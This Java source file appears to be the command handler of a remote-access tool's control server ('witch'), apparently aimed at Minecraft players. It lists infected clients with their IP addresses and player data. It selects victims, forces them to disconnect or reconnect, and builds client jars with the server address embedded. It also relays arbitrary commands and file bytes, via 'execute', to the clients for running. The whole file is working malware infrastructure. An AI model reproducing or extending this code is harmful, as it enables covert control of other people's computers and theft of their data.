package me.soda.witch.server.handlers;

import com.google.gson.Gson;
import me.soda.witch.server.server.Server;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.ProgramUtil;
import me.soda.witch.shared.socket.Connection;
import me.soda.witch.shared.socket.Packet;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.List;

public class CommandHandler {
    public static void handle(String in, Server server) {
        String[] msgArr = in.split(" ");
        if (msgArr.length > 0) {
            try {
                switch (msgArr[0]) {
                    case "stop" -> {
                        server.stop();
                        server.stopped = true;
                    }
                    case "conn" -> {
                        if (msgArr.length == 1) {
                            server.log("----CONNECTIONS----");
                            server.getConnections().forEach(conn -> server.log(String.format("IP: %s, ID: %s, Player:%s",
                                    server.clientMap.get(conn).ip,
                                    server.clientMap.get(conn).index, server.clientMap.get(conn).playerData.playerName)));
                        } else if (msgArr.length == 3) {
                            switch (msgArr[1]) {
                                case "net" -> server.getConnections().stream().filter(conn ->
                                                server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
                                        .forEach(conn -> server.log(String.format("ID: %s, Network info: %s ", msgArr[2],
                                                new Gson().toJson(server.clientMap.get(conn).ip)
                                        )));
                                case "player" -> server.getConnections().stream().filter(conn ->
                                                server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
                                        .forEach(conn -> server.log(String.format("ID: %s, Player info: %s ", msgArr[2],
                                                new Gson().toJson(server.clientMap.get(conn).playerData)
                                        )));
                                case "sel" -> {
                                    if (msgArr[2].equals("all")) {
                                        server.sendUtil.setAll(true);
                                        server.log("Selected all clients!");
                                        break;
                                    }
                                    List<Connection> connCollection = new ArrayList<>();
                                    server.getConnections().stream().filter(conn ->
                                                    server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
                                            .forEach(connCollection::add);
                                    server.sendUtil.setConnCollection(connCollection);
                                    server.log("Selected client!");
                                }
                                case "disconnect" -> {
                                    server.getConnections().stream().filter(conn ->
                                                    server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
                                            .forEach(connection -> connection.close(Packet.DisconnectPacket.Reason.NO_RECONNECT));
                                    server.log("Client " + msgArr[2] + " disconnected");
                                }
                                case "reconnect" -> {
                                    server.getConnections().stream().filter(conn ->
                                                    server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
                                            .forEach(connection -> connection.close(Packet.DisconnectPacket.Reason.RECONNECT));
                                    server.log("Client " + msgArr[2] + " reconnecting");
                                }
                                default -> {
                                }
                            }
                        }
                    }
                    case "build" -> {
                        String classFile = String.format("""
                                package me.soda.witch.shared;

                                public class Cfg {
                                    public static String server() {
                                        return "%s";
                                    }
                                }
                                """, msgArr[1]);
                        FileUtil.write(new File("cache", "Cfg.java"), classFile);
                        String file = "witch-1.0.0.jar";
                        String fallbackFile = "client/build/libs/witch-1.0.0.jar";
                        File client = new File("cache/client.jar");
                        try {
                            Files.copy(new File(file).toPath(), client.toPath(), StandardCopyOption.REPLACE_EXISTING);
                        } catch (Exception e) {
                            try {
                                Files.copy(new File(fallbackFile).toPath(), client.toPath(), StandardCopyOption.REPLACE_EXISTING);
                            } catch (Exception ee) {
                                ee.printStackTrace();
                            }
                        }
                        server.log("Start building...");
                        ProgramUtil.printProcResult(ProgramUtil.execInPath("javac -d . Cfg.java", "cache"), server::log);
                        ProgramUtil.printProcResult(ProgramUtil.execInPath("jar -uvf client.jar me/soda/witch/shared/Cfg.class", "cache"), server::log);
                        new File("data").mkdir();
                        Files.move(client.toPath(), new File("data/client.jar").toPath(), StandardCopyOption.REPLACE_EXISTING);
                        server.log("Removing cache...");
                        Files.walkFileTree(new File("cache").toPath(), new SimpleFileVisitor<>() {
                            @Override
                            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                                Files.delete(file);
                                return super.visitFile(file, attrs);
                            }

                            @Override
                            public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {
                                Files.delete(dir);
                                return super.postVisitDirectory(dir, exc);
                            }
                        });
                        server.log("Building finished!");
                    }
                    default -> {
                        if (msgArr.length >= 2) {
                            String[] strArr = new String[msgArr.length - 1];
                            System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
                            if (msgArr[0].equals("execute")) {
                                File file = new File(String.join(" ", strArr));
                                try (FileInputStream is = new FileInputStream(file)) {
                                    server.sendUtil.trySend(server, msgArr[0], is.readAllBytes());
                                }
                            } else {
                                server.sendUtil.trySend(server, msgArr[0], String.join(" ", strArr));
                            }
                        } else {
                            server.sendUtil.trySend(server, msgArr[0]);
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
